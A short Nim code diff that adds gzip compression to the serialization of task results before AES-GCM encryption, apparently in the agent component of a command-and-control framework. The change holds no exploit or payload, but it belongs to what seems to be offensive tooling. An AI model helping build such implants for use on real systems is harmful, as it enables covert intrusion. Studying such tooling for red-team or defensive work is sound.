@@ -1,4 +1,4 @@
-import times, sugar
+import times, zippy
 import ../../common/[types, serialize, sequence, crypto, utils]
 
 proc createTaskResult*(task: Task, status: StatusType, resultType: ResultType, resultData: seq[byte]): TaskResult = 
@@ -44,8 +44,11 @@ proc serializeTaskResult*(ctx: AgentCtx, taskResult: var TaskResult): seq[byte] 
     let body = packer.pack()
     packer.reset()
 
+    # Compress payload 
+    let compressedPayload = compress(body, BestCompression, dfGzip)
+
     # Encrypt result body 
-    let (encData, gmac) = encrypt(ctx.sessionKey, taskResult.header.iv, body, taskResult.header.seqNr)
+    let (encData, gmac) = encrypt(ctx.sessionKey, taskResult.header.iv, compressedPayload, taskResult.header.seqNr)
 
     # Set authentication tag (GMAC)
     taskResult.header.gmac = gmac
